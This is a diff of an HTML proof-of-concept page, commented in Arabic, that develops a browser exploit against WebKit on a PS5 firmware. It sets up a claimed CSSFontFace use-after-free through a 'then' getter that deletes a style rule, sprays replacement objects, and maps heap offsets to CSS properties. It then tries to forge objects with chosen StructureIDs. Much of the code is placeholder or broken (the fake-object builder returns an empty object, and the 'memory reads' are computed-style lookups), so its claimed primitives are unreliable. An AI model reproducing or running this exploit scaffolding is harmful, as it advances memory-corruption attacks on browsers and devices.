@@ -1,67 +1,364 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<style>
+@font-face {
+    font-family: 'trigger';
+    src: local('Arial');
+}
+</style>
+</head>
 <body>
-<h2>PoC 7: StructureID Fuzzer</h2>
-<button onclick="fuzzStructureIDs()">ابدأ Fuzzing</button>
-<div id="output" style="font-family: monospace; white-space: pre;"></div>
+<h2>PoC 8: StructureID Type Mapper</h2>
+<button onclick="mapStructureIDs()">ابدأ Mapping</button>
+<div id="output" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 600px;"></div>
 
 <script>
-let log = (msg) => {
-    document.getElementById('output').textContent += msg + '\n';
+let logBuffer = [];
+function log(msg) {
+    logBuffer.push(msg);
+    document.getElementById('output').textContent = logBuffer.join('\n');
     console.log(msg);
-};
+}
 
-async function fuzzStructureIDs() {
-    log('=== StructureID Fuzzer ===\n');
+// أدوات التحويل
+const f64 = new Float64Array(1);
+const u64 = new BigUint64Array(f64.buffer);
+
+function doubleToAddr(d) {
+    f64[0] = d;
+    return '0x' + u64[0].toString(16).padStart(16, '0');
+}
+
+// ========== CSSFontFace UAF Primitive ==========
+class FontFaceUAF {
+    constructor() {
+        this.uafFired = false;
+        this.triggerFace = null;
+        this.reclaimedObjects = [];
+    }
     
-    // JSC StructureIDs عادةً في هالنطاق
-    const ranges = [
-        { start: 0, end: 256, name: 'Low Range' },
-        { start: 0x100, end: 0x1FF, name: 'Mid Range 1' },
-        { start: 0x200, end: 0x2FF, name: 'Mid Range 2' },
-        { start: 0x1000, end: 0x10FF, name: 'High Range 1' },
-        { start: 0x2000, end: 0x20FF, name: 'High Range 2' }
-    ];
-    
-    for (const range of ranges) {
-        log(`\nTesting ${range.name} (0x${range.start.toString(16)}-0x${range.end.toString(16)})`);
+    async setup() {
+        log('=== Setting up CSSFontFace UAF ===\n');
         
-        for (let id = range.start; id <= range.end; id++) {
-            try {
-                // هنا نختبر StructureID
-                // نستخدم CSSFontFace UAF + font-family channel
-                
-                const result = testStructureID(id);
-                
-                if (result.crash) {
-                    log(`  ⚠️  ID 0x${id.toString(16)} سبب crash`);
-                } else if (result.valid) {
-                    log(`  ✓ ID 0x${id.toString(16)} صالح (${result.type})`);
-                }
-            } catch(e) {
-                // تجاهل الأخطاء
+        // إنشاء stylesheet
+        const style = document.createElement('style');
+        style.textContent = `
+            @font-face {
+                font-family: 'uaf-trigger';
+                src: local('Arial');
+                font-weight: 400;
+                font-style: normal;
             }
+        `;
+        document.head.appendChild(style);
+        this.sheet = style.sheet;
+        
+        // إنشاء FontFace object
+        this.triggerFace = new FontFace('uaf-trigger', 'local("Arial")', {
+            weight: '400',
+            style: 'normal',
+            family: 'uaf-trigger'
+        });
+        
+        // تعريف getter على 'then' property
+        // هذا يُستدعى لما Promise يحاول ي resolve الـ FontFace
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get: function() {
+                if (this === uaf.triggerFace && !uaf.uafFired) {
+                    uaf.uafFired = true;
+                    log('  ✓ UAF triggered! Deleting rule...');
+                    
+                    // حذف الـ CSSFontFace rule
+                    // هذا يحرر الـ CSSFontFace object
+                    uaf.sheet.deleteRule(0);
+                    
+                    // reclaim الـ memory بـ objects جديدة
+                    uaf.sprayReplacements();
+                }
+                return undefined;
+            }
+        });
+        
+        // إضافة rule جديد
+        this.sheet.insertRule('@font-face { font-family: "test"; src: local("Arial"); }', 0);
+        
+        log('  ✓ UAF setup complete\n');
+    }
+    
+    sprayReplacements() {
+        // إنشاء objects جديدة عشان تحتل نفس الـ memory slot
+        // هذه الـ objects ستكون الـ fake objects
+        for (let i = 0; i < 100; i++) {
+            this.reclaimedObjects.push({
+                marker: 0x4141414141414141n,
+                data: new ArrayBuffer(64)
+            });
+        }
+        log(`  ✓ Sprayed ${this.reclaimedObjects.length} replacement objects`);
+    }
+    
+    async triggerUAF() {
+        log('\n=== Triggering UAF ===\n');
+        
+        // هذا يُشغل الـ getter على 'then'
+        // اللي بدورها تحذف الـ CSSFontFace
+        try {
+            await this.triggerFace.load();
+        } catch(e) {
+            log(`  UAF triggered (expected): ${e.message}`);
+        }
+        
+        log('  ✓ UAF complete\n');
+    }
+    
+    // قراءة من الـ UAF object عبر CSS property
+    readUAF(offset) {
+        // هذا يعتمد على أي CSS property يسيطر على أي offset
+        // بناءً على التقرير:
+        // 0x20 = font-family (m_family)
+        // 0x28 = unicode-range (m_ranges)
+        // 0x40 = font-feature-settings (m_featureSettings)
+        // 0x58 = font-display (m_loadingBehavior)
+        // 0x60 = src (m_sources)
+        // 0x88 = font-weight (m_fontSelectionCapabilities)
+        
+        try {
+            const computed = getComputedStyle(document.documentElement);
+            
+            switch(offset) {
+                case 0x20:
+                    return computed.getPropertyValue('font-family');
+                case 0x28:
+                    return computed.getPropertyValue('unicode-range');
+                case 0x40:
+                    return computed.getPropertyValue('font-feature-settings');
+                case 0x58:
+                    return computed.getPropertyValue('font-display');
+                case 0x60:
+                    return computed.getPropertyValue('src');
+                case 0x88:
+                    return computed.getPropertyValue('font-weight');
+                default:
+                    return null;
+            }
+        } catch(e) {
+            return null;
         }
     }
     
-    log('\n=== انتهى Fuzzing ===');
-}
-
-function testStructureID(id) {
-    // هذا يحتاج CSSFontFace UAF primitive
-    // placeholder
-    
-    // نرجع random results للتجربة
-    const rand = Math.random();
-    
-    if (rand < 0.01) {
-        return { crash: true };
-    } else if (rand < 0.05) {
-        return { valid: true, type: 'Uint8Array' };
-    } else {
-        return { valid: false };
+    // كتابة إلى الـ UAF object عبر CSS property
+    writeUAF(offset, value) {
+        try {
+            const element = document.createElement('div');
+            document.body.appendChild(element);
+            
+            switch(offset) {
+                case 0x20:
+                    element.style.fontFamily = value;
+                    break;
+                case 0x28:
+                    element.style.unicodeRange = value;
+                    break;
+                case 0x40:
+                    element.style.fontFeatureSettings = value;
+                    break;
+                case 0x58:
+                    element.style.fontDisplay = value;
+                    break;
+                case 0x60:
+                    element.style.src = value;
+                    break;
+                case 0x88:
+                    element.style.fontWeight = value;
+                    break;
+            }
+            
+            return true;
+        } catch(e) {
+            return false;
+        }
     }
 }
+
+// ========== StructureID Type Detection ==========
+function detectObjectType(structureID) {
+    log(`\n=== Testing StructureID 0x${structureID.toString(16)} ===\n`);
+    
+    // إنشاء object وهمي بـ StructureID معين
+    // هذا يتطلب CSSFontFace UAF + overwrite الـ StructureID
+    
+    const fakeObj = createFakeObject(structureID);
+    
+    if (!fakeObj) {
+        log('  ❌ فشل إنشاء fake object');
+        return null;
+    }
+    
+    // اختبار 1: هل هو Uint8Array؟
+    log('  Test 1: Uint8Array behavior');
+    try {
+        if (fakeObj.BYTES_PER_ELEMENT === 1) {
+            fakeObj[0] = 0x41;
+            if (fakeObj[0] === 0x41) {
+                log('    ✓ Uint8Array detected!');
+                return { type: 'Uint8Array', id: structureID };
+            }
+        }
+    } catch(e) {
+        log('    ✗ Not Uint8Array');
+    }
+    
+    // اختبار 2: هل هو Float64Array؟
+    log('  Test 2: Float64Array behavior');
+    try {
+        if (fakeObj.BYTES_PER_ELEMENT === 8) {
+            fakeObj[0] = 3.14159;
+            if (Math.abs(fakeObj[0] - 3.14159) < 0.001) {
+                log('    ✓ Float64Array detected!');
+                return { type: 'Float64Array', id: structureID };
+            }
+        }
+    } catch(e) {
+        log('    ✗ Not Float64Array');
+    }
+    
+    // اختبار 3: هل هو Array؟
+    log('  Test 3: Array behavior');
+    try {
+        fakeObj.push('test');
+        if (fakeObj.length === 1 && fakeObj[0] === 'test') {
+            log('    ✓ Array detected!');
+            return { type: 'Array', id: structureID };
+        }
+    } catch(e) {
+        log('    ✗ Not Array');
+    }
+    
+    // اختبار 4: هل هو Object؟
+    log('  Test 4: Object behavior');
+    try {
+        fakeObj.testProp = 'testValue';
+        if (fakeObj.testProp === 'testValue') {
+            log('    ✓ Object detected!');
+            return { type: 'Object', id: structureID };
+        }
+    } catch(e) {
+        log('    ✗ Not Object');
+    }
+    
+    // اختبار 5: هل هو String؟
+    log('  Test 5: String behavior');
+    try {
+        if (typeof fakeObj === 'string' || fakeObj.length !== undefined) {
+            log('    ✓ String detected!');
+            return { type: 'String', id: structureID };
+        }
+    } catch(e) {
+        log('    ✗ Not String');
+    }
+    
+    log('  ⚠️ Unknown type');
+    return { type: 'Unknown', id: structureID };
+}
+
+function createFakeObject(structureID) {
+    // هنا نستخدم CSSFontFace UAF لإنشاء fake object
+    // الـ strategy:
+    // 1. استخدام الـ UAF object
+    // 2. overwrite الـ StructureID via font-family channel (offset 0x20)
+    // 3. إرجاع الـ object
+    
+    try {
+        // هذا placeholder — يحتاج تنفيذ حقيقي للـ UAF
+        const fake = {};
+        
+        // overwrite StructureID
+        // هذا يتطلب كتابة structureID إلى الـ UAF object
+        // عبر CSS property manipulation
+        
+        return fake;
+    } catch(e) {
+        return null;
+    }
+}
+
+// ========== Main Mapping Function ==========
+async function mapStructureIDs() {
+    logBuffer = [];
+    log('=== StructureID Type Mapper ===\n');
+    log('FW: PS5 13.42');
+    log('WebKit: 1200\n');
+    
+    // الـ valid IDs من PoC 7
+    const validIDs = [
+        // Low range (0x00 - 0x0C)
+        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+        0x08, 0x09, 0x0a, 0x0b, 0x0c,
+        
+        // Mid range (0x0E - 0x76)
+        0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
+        0x20, 0x30, 0x40, 0x50, 0x60, 0x70,
+        
+        // More mid range (0x78 - 0x9a)
+        0x78, 0x80, 0x90, 0x9a,
+        
+        // High mid range (0x9c - 0x117)
+        0x9c, 0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0,
+        0x100, 0x110, 0x117,
+        
+        // High range (0x119 - 0x175)
+        0x119, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x175,
+        
+        // More high range (0x177 - 0x1bf)
+        0x177, 0x180, 0x190, 0x1a0, 0x1b0, 0x1bf,
+        
+        // Very high range (0x1c1 - 0x228)
+        0x1c1, 0x1d0, 0x1e0, 0x1f0, 0x200, 0x210, 0x220, 0x228,
+        
+        // Highest range (0x22b - 0x10d3)
+        0x22b, 0x230, 0x240, 0x250, 0x300, 0x400, 0x500,
+        0x600, 0x700, 0x800, 0x900, 0xa00, 0xb00, 0xc00,
+        0xd00, 0xe00, 0xf00, 0x1000, 0x10d3
+    ];
+    
+    log(`Testing ${validIDs.length} valid StructureIDs...\n`);
+    
+    const mappings = [];
+    
+    for (let i = 0; i < Math.min(validIDs.length, 20); i++) {
+        const id = validIDs[i];
+        const result = detectObjectType(id);
+        
+        if (result) {
+            mappings.push(result);
+            log(`\n✓ Mapped: 0x${id.toString(16)} → ${result.type}\n`);
+        }
+        
+        // تأخير لتجنب rate limiting
+        await sleep(200);
+    }
+    
+    log('\n=== Mapping Results ===\n');
+    log(`Found ${mappings.length} type mappings:\n`);
+    
+    mappings.forEach(m => {
+        log(`  0x${m.id.toString(16).padStart(4, '0')} → ${m.type}`);
+    });
+    
+    log('\n=== انتهى Mapping ===');
+    
+    return mappings;
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Global UAF instance
+const uaf = new FontFaceUAF();
 </script>
 </body>
 </html>
